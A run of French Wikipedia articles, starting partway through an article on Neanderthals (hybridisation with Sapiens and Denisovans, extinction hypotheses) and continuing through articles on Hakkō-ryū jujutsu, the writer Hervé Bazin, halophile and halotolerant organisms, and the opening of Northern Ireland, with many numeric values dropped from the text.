En 2018, l'ADN d'un fragment osseux trouvé dans la grotte de Denisova, celui d'une adolescente morte vers 13 ans il y a environ , montre qu'elle était l'hybride d'une mère néandertalienne et d'un père dénisovien. C'est le premier cas reconnu d'une hybridation entre espèces humaines au premier degré.
Interfécondité.
En 2016, une information nouvelle a contribué aux débats : alors que les séquençages précédents concernaient l'ADN autosomal (non sexuel), une première description d'un chromosome Y (et donc masculin) néandertalien (provenant de la grotte d'El Sidrón, Espagne, il y a ) a montré de grandes différences avec le chromosome Y humain actuel. Même si des Néandertaliens et des humains modernes se sont hybridés il y a quelque , l'ADN du chromosome Y néandertalien ne semble pas avoir été transmis aux humains modernes. Ceci va dans le sens d'études antérieures constatant que si les Asiatiques et les Européens actuels ont bien hérité de 1 % à 3 % de leur ADN de leurs ancêtres via des croisements avec des Néandertaliens, leurs chromosomes Y n'en portent pas de traces. Une hypothèse explicative serait que les deux taxons n'étaient pas entièrement compatibles : le sperme des hommes Néandertaliens pourrait avoir été non fécondant pour les femmes « modernes » de leur époque. On a trouvé dans le chromosome Y néandertalien d'El Sidrón des mutations de trois gènes impliqués dans le système immunitaire, dont celui qui produit des antigènes pouvant provoquer une réponse immunitaire aboutissant à une fausse-couche chez les femmes enceintes. Ainsi, même si des hommes néandertaliens et des femmes « modernes » se sont sexuellement unis par le passé, ils n'ont vraisemblablement pas pu obtenir de descendance mâle suffisamment abondante ou viable, ce qui aurait pu hâter des néandertaliens.
En 2019, David Reich parle des humains modernes et des Néandertaliens comme de « deux groupes à la limite de la compatibilité », l'analyse de l'ADN ancien et de l'ADN moderne d"'Homo sapiens" montrant une expulsion progressive des gènes néandertaliens impliqués dans la reproduction. Lors de chaque reproduction, l'héritage génétique se fait au hasard, par recombinaison des génomes paternel et maternel. Et le résultat montre que les "Homo sapiens" (non-africains) qui portaient le plus de traces néandertaliennes sur les chromosomes reproductifs n'ont pas eu de descendance (ou peu), donc étaient plus touchés par des problèmes de stérilité. Cette stérilité partielle des hybrides est un des arguments en faveur de la définition de Néandertal comme une espèce à part entière.
Gènes transmis par Néandertal à "Sapiens".
Dans le génome des hommes modernes européens, un gène lié à l'immunité pourrait être issu du génome de l'Homme de Néandertal. Cette découverte est confirmée en 2016 par des études qui mettent en évidence ces cas d'introgression : gènes néandertaliens à l'origine de la stimulation immunitaire et des allergies des hommes modernes.
Certaines séquences d'ADN acquises par "Homo sapiens" auprès des Néandertaliens ont pu s’avérer bénéfiques, comme celles favorisant l'adaptation au climat froid ou résistance aux maladies. Elles ont été sélectionnées positivement alors que d'autres, délétères, ont été éliminées du génome humain par sélection négative. On trouve aujourd'hui dans le génome humain des allèles dérivés de Néandertaliens qui nous rendent à la fois sensibles ou .
Parmi les gènes que les néandertaliens nous ont transmis, certains sont associés à des traits phénotypiques ou à des maladies. Ils affectent notamment :
Cela conforte l'idée .
Gènes transmis par "Sapiens" à Néandertal.
En 2017, une étude de Cosimo Posth, analysant un fémur de Néandertalien vieux de , a montré que cet os contenait déjà des gènes caractéristiques d"'Homo sapiens". L'étude concluait que les premiers croisements entre Sapiens et Néandertal ont dû avoir lieu il y a .
Une étude identifie une transmission de gènes d"Homo sapiens" vers des Néandertaliens, probablement il y a plus de au Moyen-Orient lors d'une première sortie d'Afrique.
Une étude publiée en 2020 analyse les chromosomes Y de Néandertaliens récents. Cette étude nous renseigne donc sur les lignées agnatiques. Le signal renvoyé par ces chromosomes Y diffère grandement de celui de l'ADN autosomal. Les chromosomes Y des Dénisoviens auraient divergé il y a environ d'une lignée partagée par les chromosomes Y humains néandertaliens et sapiens alors que l'on sait que ce sont les Néandersoviens qui ont divergé de la lignée d"'Homo sapiens" vers cette date. Les lignées Y néandertalienne et sapiens se seraient séparées il y a environ . On retrouve des résultats similaires avec l'ADN mitochondrial et donc la lignée cognatique, alors que les Néandertaliens anciens de la Sima de los Huesos, datés de , avaient un ADN mitochondrial plus proche de celui des Dénisoviens. Ces résultats suggèrent un remplacement, chez les Néandertaliens moyens, des gènes néandertaliens ancestraux par des gènes en provenance de la lignée d"Homo sapiens", et ceci seulement pour les gènes uniparentaux, tant mitochondriaux (lignée maternelle) que du chromosome Y (lignée paternelle). Ce résultat montre des hybridations anciennes avec des "Homo sapiens" archaïques.
En 2024, une étude comparée du génome des deux espèces montre que plusieurs zones de celui de l'Homme de Néandertal ont une origine attribuable à "Homo sapiens" (des séquences identifiées chez des Africains sans ascendance néandertalienne), et suggère qu'il y a eu au moins deux flux génétiques dans ce sens. Les néandertaliens de la grotte de Vindija et ceux de l'Altaï ont ainsi hérité de nucléotides "sapiens" (2,5 % du génome) et (3,7 %), respectivement.
Extinction.
Les derniers Néandertaliens ont disparu plusieurs milliers d'années après l'arrivée d"Homo sapiens" par l'est de l'Europe, soit probablement il y a environ . L'extinction aurait été échelonnée dans le temps selon un gradient régional. Leur disparition a suscité de nombreuses hypothèses, certaines faisant intervenir des modèles mathématiques ou économiques. Cette disparition des Néandertaliens coïncide avec l'arrivée en Europe de groupes d'hommes modernes, porteurs d'une nouvelle culture matérielle, l'Aurignacien.
Causes d'extinction possibles.
Éruption volcanique.
Entre 2010 et 2017 ont été mises en relation la disparition de l'Homme de Néandertal et l'éruption campanienne, à l'origine de la caldeira des champs Phlégréens (baie de Naples, Italie). Des datations de cet événement publiées en 2003 donnent une date de .
Cet événement a vu la libération dans l'atmosphère d'un volume de matières volcaniques extrêmement important, d'au moins . Le panache de cendres serait monté à plus de , voire d'altitude (stratosphère), avant de retomber en un épais manteau recouvrant tout, comparable aux couches de cendres de Pompéi, sur une aire de allant de l'Italie aux steppes asiatiques, tuant toute forme de végétation sur cette zone, ainsi que toute la chaîne trophique en dépendant, grands prédateurs et "Homo" compris. L'atmosphère globale aurait été assombrie pendant plusieurs années.
Les derniers peuplements néandertaliens ayant survécu à cet évènement (présence constatée sur la péninsule Ibérique pendant encore plusieurs millénaires) auraient fini de disparaître en raison d'un manque de diversité génétique (garante de la viabilité d'une espèce).
Extinction due à des capacités cognitives inférieures.
En 2010, une équipe de paléontologues du département d'évolution humaine de l'Institut Max Planck, à Leipzig (Allemagne), a analysé l'endocrâne (l'empreinte laissée par le cerveau dans la boîte crânienne) de squelettes de néandertaliens. Les résultats ont confirmé les données sur la génétique des Néandertaliens acquises grâce au séquençage de leur ADN : le cerveau des "Homo sapiens" a une forme globulaire caractéristique qui n'existe pas chez Néandertal. Cette différence pourrait influencer l'organisation neuronale et synaptique du cerveau, et donc les capacités cognitives. Par une litote, Jean-Jacques Hublin, le chercheur français qui a dirigé cette étude, émet l'hypothèse que « l'homme de Néandertal ne voyait pas le monde de la même façon que nous » et que son incapacité à créer des liens sociaux complexes serait à l'origine de son extinction.
Extinction par stérilité de l'hybridation.
Selon une autre hypothèse, la disparition progressive de la population néandertalienne serait liée à la possibilité d'accouplements féconds mais donnant des hybrides stériles, au moins chez les Néandertaliennes. Une telle hypothèse, émise par le paléontologue finlandais Björn Kurtén, demeure difficile à tester.
Certaines études suggèrent que les enfants issus d'union entre Néandertaliens et "Homo sapiens" auraient été moins fertiles, ce qui aurait entraîné une diminution de la proportion de gènes hérités de Neandertal.
Extinction par consanguinité et petitesse de la population.
La diversité génétique de l'espèce semble s'être fortement réduite au cours du Pléistocène supérieur, comme le montrent les analyses faites sur les séquences connues entre , au moment où Néandertal cohabitait avec l’"Homo sapiens". Ce constat nourrit la thèse du déclin démographique de Néandertal sur cette période, déclin conduisant, par un phénomène de goulet d'étranglement de population, à la disparition progressive de certains génotypes, donc à l'appauvrissement génétique de l'espèce.
Ont également été évoqués des problèmes d'ordre génétique liés à une forte consanguinité et/ou des mutations spontanées ayant entraîné des maladies congénitales telles que l'hémophilie, le diabète insulino-dépendant ou une forme de stérilité, ayant suffisamment affecté la démographie de la population pour la faire disparaître.
Partant de l'observation que les populations néandertaliennes étaient déjà petites avant l'arrivée de l'Homme moderne, une étude publiée en 2019 met en œuvre trois facteurs que la biologie de la conservation identifie comme essentiels pour la persistance d'une petite population, à savoir la consanguinité, l'effet Allee et la stochasticité. Les résultats indiquent que la disparition des Néandertaliens peut avoir résidé dans la petitesse de leur seule population. Ainsi, même s'ils étaient identiques dans leurs traits cognitifs, sociaux et culturels, et même en l'absence de compétition interspécifique, les Néandertaliens couraient un risque d'extinction considérable. En outre, les auteurs suggérent que si les humains modernes ont contribué à la disparition des Néandertaliens, cette contribution n'aurait peut-être rien à voir avec la concurrence des ressources, mais plutôt avec la façon dont les populations entrantes ont restructuré géographiquement les populations résidentes, d'une manière qui a renforcé les effets Allee, et les effets de consanguinité et stochasticité. L'analyse du génome d'un individu néandertalien tardif, surnommé « Thorin », trouvé dans la grotte Mandrin (Drôme) semble confirmer ces hypothèses : celui-ci révèle une profonde divergence avec les autres Néandertaliens tardifs, Thorin appartenant à une population de petite taille qui ne présentait aucune introgression génétique avec d'autres Néandertaliens européens tardifs connus, révélant l'isolement génétique de sa lignée bien que ces individus vécussent dans des régions voisines.
Autres facteurs biologiques.
La trompe d'Eustache néandertalienne, plus courte que celle des "Homo sapiens", aurait favorisé des infections de l'oreille à répétition, fragilisant les Néandertaliens et participant à leur disparition.
Il est possible qu'une meilleure résistance d"'Homo sapiens" au saturnisme ait joué un rôle dans sa perpétuation à l'inverse des Néandertaliens et des Dénisoviens, cette résistance ayant par ailleurs rendu les humains modernes mieux à même de communiquer et de tisser des liens, ce qui les aurait aidés à faire face aux variations climatiques et autres pressions sélectives. La composition chimique des dents fossiles montre en effet que l'empoisonnement au plomb, via la consommation de l'eau et des plantes, était endémique chez nos ancêtres dès la petite enfance il y a déjà deux millions d'années. Parmi les 61 gènes codants qui distinguent "H. sapiens" des deux autres espèces, "NOVA1" contribue au développement neurologique et active ou désactive des centaines d'autres mécanismes génétiques dans le cerveau ; chez l'homme moderne, ce gène semble favoriser la complexité au détriment d'une maturation plus lente, tandis que la variante présente chez les autres grands singes, dont les Néandertaliens et les Dénisoviens, a l'effet inverse. Or le plomb perturbe différemment le développement des deux types de cerveaux : l'étude du développement d'organoïdes portant les différents variants montre que la version archaïque du gène perturbe notamment, en présence de concentrations naturelles du plomb, les neurones exprimant le gène "FOXP2", dont on sait que les mutations sont impliquées dans plusieurs troubles de la communication ; chez les organoïdes humains modernes, ces neurones restent pratiquement intacts.
Coexistence avec "Homo sapiens".
La disparition des Néandertaliens serait liée à l'arrivée des hommes modernes et à la compétition territoriale pour l'exploitation des ressources, voire à leur élimination physique par les hommes modernes à l'occasion de conflits violents sur les zones de contact. L'hypothèse s'appuie en particulier sur la concomitance de l'expansion dHomo sapiens" et de la disparition de Néandertal ; les "Homo sapiens" d'Europe de l'Ouest cohabitant par exemple pendant plusieurs milliers d'années (500 à suivant les régions) avec les Néandertaliens. Elle se heurte toutefois à l'absence de traces de morts violentes ou de traces de cohabitation prolongée sur un même territoire. En outre on peut objecter que les deux groupes ne devaient pas occuper l'ensemble du territoire européen et que les Néandertaliens avaient une meilleure connaissance de ce territoire et de ses ressources que les nouveaux arrivants. La domestication du chien pour la chasse correspondant approximativement à la période de disparition des Néandertaliens, Pat Shipman a émis l'hypothèse selon laquelle cet événement aurait permis à "Homo sapiens" de bénéficier d'un net avantage dans sa recherche de nourriture.
Outre cette hypothèse de l'extinction violente liée à l'homme moderne, les Néandertaliens auraient pu succomber à une maladie mortelle (épidémies) apportée par les Sapiens originaires d'Afrique.
L'Homme de Néandertal dans les œuvres de fiction.
Les Néandertaliens ont été dépeints dans la culture populaire, y compris les apparitions dans la littérature, les médias visuels et la comédie. L'archétype des « hommes des cavernes » se moque souvent des Néandertaliens et les décrit comme des personnages primitifs, bossus, brandissant des massues, grognants, des personnages antisociaux mus uniquement par l'instinct animal. « Néandertal » peut également être utilisé comme une insulte.

</doc>
<doc id="1484" url="https://fr.wikipedia.org/wiki?curid=1484" title="Hakkō-ryū">
Hakkō-ryū

Le hakkō-ryū (ou "hakkō-ryū-jū-jutsu") est un art martial japonais.
Histoire.
Le "hakkō-ryū-jū-jutsu" prend naissance à la même époque que l'aïkido. C'est en 1938 que le "soke" Ryuho Okuyama, alors âgé de trente-cinq ans, et qui vient de terminer ses études de médecine, ouvre son premier dojo à Tokyo. La technique qu'il enseigne, nommée "hakkō-ryū", tire ses origines des "Daitōryū aikijūjutsu", "kito-ryū", "takenuchi-ryū" et "tenshin-shinyo-ryū".
On peut remarquer des similitudes avec l'aïkido, ce qui explique les quelques ressemblances qui existent sur la forme de ces deux disciplines, la finalité étant cependant sensiblement différente.
"hakkō-ryū" signifie « école de la huitième lumière ». Cette huitième lumière, l'ultraviolet, résultat de la dispersion des sept couleurs de l'arc-en-ciel, évoque l'effet non perceptible des techniques du "hakkō-ryū". Car au-delà de la "self-defense", le but du "hakkō-ryū" est l'équilibre et la santé du pratiquant. Chacune des techniques élaborées par Okuyama possède une interprétation physiologique au sens de la médecine orientale et est destinée à produire un effet bien déterminé sur les organes vitaux du pratiquant.
Le "hakkō-ryū-jū-jutsu" est considéré par ses pratiquants comme étant à la fois une école de santé et une école d'efficacité. Elle procède à une éducation progressive et rationnelle du corps en vue de la défense par la souplesse et ne se limite pas à un enseignement superficiel d'autodéfense.
Après une trêve due à la loi martiale qui interdit la pratique des arts martiaux au Japon, Okuyama s'établit en 1947 à Ōmiya, dans la préfecture de Saitama, à proximité de Tokyo. C'est là qu'il installe le "honbu-dōjō", qui devient le centre mondial du "hakkō-ryū-jū-jutsu".
Après s'être développé au Japon, le "hakkō-ryū" s'implante successivement aux États-Unis, au Canada, en Australie puis en Europe.
Le "hakkō-ryū" apparaît en France pour la première fois en 1970 avec la venue à Paris du Japonais Takeshi Dogane, quatrième dan à l'époque, qui y séjournera durant deux ans.
Mais la véritable implantation du "hakkō-ryū" en France se fera vers les années 1975-1976, plusieurs Français ayant obtenu le titre de "shihan" à la suite de stages au Japon.
Certains de ces précurseurs ont maintenant dévié du "hakkō-ryū" pour créer leur propre école en ajoutant à la progression japonaise originelle des techniques empruntées à d'autres disciplines.
De nos jours, très peu de dojos en France et en Europe enseignent encore fidèlement les techniques du "hakkō-ryū" telles que définies par Ryuho Okuyama, qui font toute la spécificité et la richesse de cette école.
Le dojo de Pontchâteau en Loire Atlantique est l'un d'entre eux.

</doc>
<doc id="1485" url="https://fr.wikipedia.org/wiki?curid=1485" title="Hervé Bazin">
Hervé Bazin

Hervé Bazin, de son nom de naissance Jean Pierre Marie Hervé-Bazin, né le à Angers, où il meurt le , est un écrivain et romancier français, connu en particulier pour ses romans d'inspiration autobiographique ("Vipère au poing", "La Mort du petit cheval" et "Cri de la chouette").
Biographie.
Famille.
Hervé Bazin naît dans une famille aisée. Son père, Jacques Hervé-Bazin (1882-1944), est docteur en droit, avocat de profession, et enseigne durant plusieurs années à l'université catholique l'Aurore à Shanghaï (Chine). Sa mère, Paule Guilloteaux (1890-1960), issue d'une très riche famille, est la fille de Jean Guilloteaux (1865-1949), député puis sénateur du Morbihan. Éduquée chez les sœurs des Fidèles compagnes de Jésus, elle ne rencontre que deux fois son futur époux avant son mariage qui est arrangé par ses parents.
Sa grand-mère paternelle, Marie Bazin (1850-1919), auteure de plusieurs romans sous le pseudonyme de Jacques Bret, est la sœur du romancier et académicien français René Bazin (1853-1932). Il est cousin par alliance de Paul Claudel, celui-ci ayant épousé la fille d'une cousine germaine du père d'Hervé Bazin.
Enfance et jeunesse.
À leur retour de Chine, ses parents s'installent en 1922 à Marans, près d'Angers, dans la maison d'été familiale sans chauffage, le château du Patys, où il vit avec ses deux frères. À la suite d'une otite qui s'est aggravée, il doit subir une trépanation.
Séjour à Vioménil.
Après son exclusion de deux établissements scolaires, le lycée Sainte-Croix du Mans, puis Notre-Dame de Combrée, le jeune Jean Hervé-Bazin est envoyé en 1923 par son père, à titre de punition, auprès de l'abbé Félix Maire, , qui vit retiré dans son village natal de Vioménil dans les Vosges. L'abbé Félix Maire avait été le précepteur de Jacques Hervé-Bazin de 1890 à 1895.
Il séjourne chez lui jusqu'en 1925. Il est envoyé ensuite au prytanée militaire de La Flèche.
Rupture avec la famille.
En 1929 , il cambriole la maison familiale. À vingt ans, il rompt avec sa famille . Après un accident de voiture, , il est placé par ses parents dans un asile psychiatrique, à Sainte-Gemmes-sur-Loire, dont il s'évade.
Jusqu'à la parution du livre-enquête d'Émilie Lanez, sa vie entre 1935 et 1948 est mal connue. Dans "Clairvaux en guerre", Dominique Fey et Lydie Herbelot précisent qu'il a été condamné à deux ans de prison, le 16 octobre 1936, par la chambre correctionnelle de Paris, pour plusieurs escroqueries aux mandats postaux qu’il avait réalisées en 1935 et 1936 alors qu'il travaillait aux PTT. Il avait précédemment alterné séjours en prison, tout d'abord à Fresnes, et internements en psychiatrie à l'hôpital Saint-Anne où les médecins avaient posé en 1935 un diagnostic de psychopathie. Sa famille le place sous tutelle judiciaire en 1937. Hervé Bazin se trouve en 1942 à la maison centrale de Clairvaux, sous le numéro d'écrou 3624, sans qu'on connaisse les raisons de son incarcération. Il est libéré de prison le 25 juillet 1944.
En 1946, il crée la revue poétique "La Coquille" (huit parutions seulement). En 1947, il obtient le prix Apollinaire pour "Jour", son premier recueil de poèmes, qui est suivi par "À la poursuite d'Iris" en 1948. Il se détourne ensuite de la poésie pour la prose.
"Vipère au poing".
Les conflits qu'il aurait eus avec sa mère durant son enfance lui inspirent son premier roman présenté comme autobiographique, "Vipère au poing". Y est narrée la haine entre Folcoche, mère sèche et cruelle, constamment à la recherche de nouveaux moyens de brimade, et ses enfants. Le narrateur est Jean Rezeau, surnommé Brasse-Bouillon, et l'action se déroule dans les lieux mêmes de son enfance, le château du Patys, rebaptisé "La Belle Angerie".
Nom d'auteur.
Il adresse aux éditions Grasset son manuscrit de "Vipère au poing" sous son véritable nom, Jean Hervé-Bazin. Après son acceptation par Jean Blanzat, directeur littéraire, Bernard Grasset décide d'autorité que la publication du livre, en 1948, sous le nom d'Hervé Bazin suffirait.
Il décide aussi de rajeunir son nouveau poulain littéraire en le faisant naître en 1917, au lieu de 1911, pour donner l'impression qu'il s'agit d'un jeune auteur. En 1948, Bazin a déjà .
Une mystification littéraire ?
À l'automne 2025, l'authenticité de ce récit est mise en doute par le livre-enquête d’Émilie Lanez, "Folcoche", publié chez Grasset. Selon les recherches de l'auteure, "Vipère au poing" serait une mystification littéraire conçue comme une vengeance contre sa famille et un moyen de faire lever la tutelle sous laquelle il avait été placé en 1937 en raison de ses différentes frasques, et ainsi toucher sa part d'héritage. Hervé Bazin aurait soigneusement occulté la quinzaine d'années de sa vie qui a précédé la parution de "Vipère au poing". Sa mère, restée muette sur la caricature qu'il a donnée d'elle dans ce roman, se réconcilie finalement avec lui en 1954.
Carrière littéraire.
Maurice Nadeau apprécie ces « Atrides en gilet de flanelle », selon l'expression d'Hervé Bazin. Le roman connaît un immense succès.
Il est suivi de nombreux autres qui décrivent, avec un certain naturalisme et un art consommé du portrait psychologique, les mœurs de son époque. Deux autres romans ("La Mort du petit cheval" et "Cri de la chouette") auront comme héros les personnages déjà présents dans "Vipère au poing".
En 1950, Bazin participe, avec d’autres écrivains comme Marcelle Auclair, Jacques Audiberti, Émile Danoën, Maurice Druon et André Maurois, au numéro de la revue "La Nouvelle équipe française" de Lucie Faure, intitulé « L’Amour est à réinventer ».
Après avoir fait paraître en 1949 le roman "La Tête contre les murs," tiré de son expérience personnelle, il veut témoigner en 1954 de l'état déplorable des établissements psychiatriques (qui pour lui n'avaient pas changé depuis ses démêlés familiaux de 1940), et entreprend un tour de France de ces hôpitaux (entre autres l'hospice Pasteur à Poitiers), accompagné du photographe Jean-Philippe Charbonnier, enquête qui sera publiée dans la revue "Réalités" de .
En 1957, il obtient le grand prix de littérature de Monaco.
De 1959 à 1960, Hervé Bazin réside à Anetz dans la maison de l'Emeronce avec une vue imprenable sur la Loire et la rive opposée située en Anjou. C'est en ce lieu qu'il écrira son roman "Au nom du fils".
Il est élu membre de l'académie Goncourt en 1960, au couvert de Francis Carco. Il en deviendra président en 1973 et contribuera au développement du prix Goncourt des lycéens.
En 1970, il publie "Les Bienheureux de La Désolation", récit construit sur une enquête britannique concernant l'évacuation des 264 habitants de l'île Tristan da Cunha, nommée aussi « île de la Désolation », rapatriés en Grande-Bretagne à la suite de l'éruption du volcan en 1961.
En 1983, Gallimard songe à faire publier ses œuvres dans la Bibliothèque de la Pléiade, un projet abandonné à la suite des critiques.
En 1990, il obtient la médaille d'argent de Florian de la ville de Sceaux.
Thématiques.
Hervé Bazin est considéré comme « un romancier de la famille », thème central de tous ses romans.
Il est aussi l'auteur de nouvelles et d'essais, comme "Ce que je crois" en 1977.
Engagements politiques.
Il s'engage dans le Mouvement de la paix, une organisation proche du Parti communiste qu'il rejoint pour s'opposer à sa famille qui appartient à la droite bourgeoise et conservatrice. Il soutient les époux Rosenberg durant leur procès.
Il obtint le prix Lénine pour la paix en 1980, ce qui fit dire plaisamment à Roger Peyrefitte : 
En 1985, il signe avec Albert Jacquard, Suzanne Prou, et Léon Schwartzenberg un article affirmant que 
Dernières années.
De 1984 à 1992, il vit à Mont-Saint-Aignan. Il passe les dernières années de sa vie à Cunault sur les bords de la Loire. Il meurt à Angers le .
Conformément à son souhait, il est incinéré et ses cendres sont dispersées dans la Maine. Toutefois, une pierre tombale à son nom est visible au cimetière de Cunault.
Unions et enfants.
Jean Pierre Hervé-Bazin s'est marié quatre fois.
Postérité.
Manuscrits.
En 1995, lors d'un déménagement, Hervé Bazin dépose ses manuscrits et sa correspondance aux archives municipales de la ville de Nancy, déjà en possession du fonds des frères Goncourt, originaires de la ville.
Après sa mort, à la suite d'un imbroglio juridique, cinq de ses premiers enfants obtiennent, contre l'avis de sa dernière épouse et de son dernier fils, la vente de ce fonds à l'hôtel Drouot, le . 
La bibliothèque universitaire d'Angers parvient à préempter la quasi-totalité de ce patrimoine, soit 22 manuscrits et près de ; seuls manquent celui de "Vipère au poing", vendu par l'auteur dans les années 1960, et celui des "Bienheureux de La Désolation", recueilli par son fils Dominique le jour de la vente.
Château du Patys.
Situé à Marans, dans le Maine-et-Loire, le château du Patys fut la demeure de jeunesse d'Hervé Bazin et de sa famille. Sa mère, qu'il dénomme « Folcoche » dans "Vipère au poing", y mourut en 1960.
La propriété de , avec un parc de , a été achetée par un particulier en 2017. Après des travaux de restauration intégrant des aménagements avec du mobilier d'époque ainsi qu'une collection d’objets liés à l'auteur, le domaine a été ouvert au public six mois par an. Pour son propriétaire, ce musée a pour objectif de faire vivre 
Le château est en vente depuis 2023.
Orthographe et ponctuation.
Dans son essai de 1966 "Plumons l'oiseau", Bazin propose une orthographe presque phonémique pour la langue française, qu'il appelle « l'ortografiǝ lojikǝ ». Il attribue cette orthographe à son ami (fictif) Alexis Patagos.
Il a également proposé six nouveaux « points d'intonation » :
Exemple :

</doc>
<doc id="1486" url="https://fr.wikipedia.org/wiki?curid=1486" title="Halophile">
Halophile

Un organisme halophile (du grec" halos", sel et "philein", aimer) est un organisme qui s'accommode ou a besoin de fortes concentrations en sel dans son milieu pour vivre. Les micro-organismes halophiles sont des extrémophiles appartenant aux domaines des archées ou des bactéries, mais des plantes sauvages des régions maritimes (les halophytes) et un grand nombre d'algues sont également halophiles.
De fait, l'halophilie est un caractère très répandu à des degrés divers dans tous les domaines du monde vivant. Au point que même pour bon nombre d'espèces animales (y compris l'homme) ou végétales terrestres qui sont généralement non considérées comme halophiles (pour lesquelles les plus hautes concentrations en sel ne sont plus supportées), une quantité faible de sel dans l'alimentation ou l'environnement reste encore nécessaire pour leur développement, leur bonne santé, leur longévité ou leur persistance endémique dans certains milieux.
Cependant pour ces espèces terrestres qui ne supportent pas les hautes concentrations salines (notamment la plupart des plantes ou animaux, et la plupart des espèces de leurs symbiotes ou parasites), on ne les considère pas comme halophiles ; le sel est donc utilisé comme agent conservateur dans l'alimentation humaine (ou animale domestique), même s’il ne protège pas des invasions par des microorganismes halophiles toxiques (tels que le staphylocoque doré qui peut coloniser rapidement des aliments salés, mais mal préparés et mal protégés).
Parmi les exemples d'Archaea halophiles, l'ordre des Halobacteriales comprend les genres "Halobacterium", "Halococcus", "Haloarcula", "Haloferax", "Natronococcus". Ces organismes halophiles sont isolés de lacs et d'étangs salés, de marais salants, de sédiments marins. Ils peuvent être rencontrés dans le Grand Lac Salé en Utah, le Lac Owens en Californie, la Mer Morte, les estuaires de la Baie de San Francisco, le Lac Magadi au Kenya, la lagune de Venise en Italie, ou les lacs du Ouadi Natroun en Égypte.
Types d'halophilie.
On distingue plusieurs types d'halophilie :
Mécanismes adaptatifs.
Ces organismes accumulent au sein de leur cytoplasme d'importantes quantités de sel, essentiellement du chlorure de potassium (KCl), proches de la saturation. De cette façon, ils empêchent la perte d'eau par osmose. Ce faisant, ces organismes s'imposent un nouveau stress cellulaire : le stress salin, lequel devrait provoquer l'insolubilité et la précipitation de ses protéines. En fait, dans les organismes halophiles, les protéines non seulement sont solubles et fonctionnelles dans de fortes concentrations en KCl, mais elles se dénaturent lorsque la concentration en sel diminue.
Certaines algues ou bactéries continentales apportées en mer par les rivières sécrètent et accumulent dans leur cytoplasme des solutés d'acides aminés comme la glycine bétaïne.
Actuellement, il n'est pas possible de dire avec certitude si les protéines halophiles sont le résultat d'une adaptation à un environnement extrême, ou bien si au contraire elles représentent la survivance de conditions de vie primitive à forte teneur en sel.
L'adaptation au sel est un caractère plastique qui offre des capacités d'adaptation aux pollutions anthropiques. C'est notamment le cas de la plante du littoral atlantique Silène à une fleur qui s'est adaptée aux sols chargés de déchets miniers riches en zinc en transférant une partie de ses gènes issus de l'adaptation au sel.

</doc>
<doc id="1487" url="https://fr.wikipedia.org/wiki?curid=1487" title="Halotolérance">
Halotolérance

Un organisme halotolérant est un organisme capable de s'adapter à de très fortes concentration en sel mais qui n'en a pas besoin pour vivre, contrairement aux halophiles.
La plupart des halotolérants sont des bactéries et des algues unicellulaires mais pas seulement, il existe aussi des plantes et des champignons halotolérants. Ils peuvent s'adapter à ces conditions en fabriquant de petites molécules en très grandes quantités, telles que du glycérol, molécules qui s'accumulent au cœur des cellules. La concentration des molécules dissoutes devient égale à la concentration de chlorure de sodium (NaCl) dans le milieu environnant. L'eau ne s'échappe plus des cellules et les conditions biochimiques ne sont pas inhibées.
Par exemple, "Staphylococcus aureus" est une bactérie à Gram+ qui est halotolérante. On peut la cultiver sur des milieux à fortes concentrations en sel. Notamment le milieu de Chapman (voir gélose Chapman) qui est a une concentration en NaCl de , un peu plus du double de celle de la mer .

</doc>
<doc id="1490" url="https://fr.wikipedia.org/wiki?curid=1490" title="Irlande du Nord">
Irlande du Nord

LIrlande du Nord ( ; ; ) est une nation constitutive du Royaume-Uni. Située dans le nord-est de l'île d'Irlande, elle partage une frontière au sud et à l'ouest avec la république d'Irlande. En juin 2024, sa population est d'environ 1 927 900, soit environ 30 % de la population de l'île et 3 % de la population du Royaume-Uni. L'Assemblée d'Irlande du Nord, établie par la loi sur l'Irlande du Nord de 1998, est responsable d'une série de questions politiques décentralisées, tandis que d'autres compétences sont réservées au gouvernement britannique. L'Irlande du Nord coopère avec la république d'Irlande dans plusieurs domaines.
L'Irlande du Nord a été créée le , lorsque l'île fut divisée par la loi sur le gouvernement de l'Irlande de 1920, qui instaura un Parlement local dans les six comtés du nord-est de l'Irlande. La majorité de la population nord-irlandaise était unioniste et souhaitait rester au sein du Royaume-Uni. Ses habitants étaient généralement les descendants de colons protestants originaires de Grande-Bretagne. En parallèle, la majorité de la population en Irlande du Sud (devenu l'État libre irlandais en 1922) et une minorité significative en Irlande du Nord étaient des nationalistes irlandais et des catholiques voulant une Irlande unie indépendante. Aujourd'hui, les premiers se considèrent généralement comme à la fois irlandais et britanniques, tandis que les seconds se considèrent généralement comme uniquement irlandais. Une identité nord-irlandaise ou d'Ulster, par référence à la province historique, est également revendiquée par une large minorité dans les deux camps.
La création de l'Irlande du Nord s'accompagna de violences à la fois en faveur et contre la partition. De 1920 à 1922, la capitale Belfast connut d'importantes violences communautaires, principalement entre les civils unionistes protestants et les nationalistes catholiques. Plus de 500 furent tués et plus de 10 000 sont devenus des réfugiés, pour la plupart catholiques. Au cours des décennies suivantes, l'Irlande du Nord connut une série ininterrompue de gouvernements dirigés par le Parti unioniste. Il exista une ségrégation mutuelle et informelle entre les deux communautés, et les gouvernements unionistes furent accusés de discrimination envers la minorité nationaliste et catholique irlandaise, dans ce que le Premier ministre d'Irlande du Nord, David Trimble, appela une « maison froide » pour les catholiques.
À la fin des années 1960, une campagne pour mettre fin à la discrimination à l'encontre des catholiques et des nationalistes se heurta à l'opposition des loyalistes, qui y voyaient un front républicain. Ces tensions engendrèrent « les Troubles », un conflit de trente ans impliquant des paramilitaires républicains et loyalistes ainsi que des forces de l'État, qui ont fait plus de 3 500 morts et 50 000 blessés. L'accord du Vendredi saint en 1998 constitua une étape majeure dans le processus de paix, notamment dans le désarmement paramilitaire et la normalisation de la sécurité, bien que le sectarisme et la ségrégation entre les deux communautés restent des problèmes sociaux majeurs et que des violences sporadiques se soient poursuivies après l'accord.
L'économie de l'Irlande du Nord était la plus industrialisée d'Irlande au moment de la partition de l'île, mais elle déclina en raison des troubles politiques et sociaux causés par le conflit nord-irlandais. Son économie s'est considérablement développée depuis la fin des années 1990. La croissance initiale, venue du « dividende de la paix » et de l'augmentation des échanges avec la république d'Irlande, se poursuivit avec une augmentation significative du tourisme, des investissements et des affaires avec le reste du monde. Le chômage en Irlande du Nord culmina à 17,2 % en 1986 et il tomba à 6,1 % durant l'été 2014, ce qui constitue un taux similaire à celui du chiffre britannique de 6,2 %.
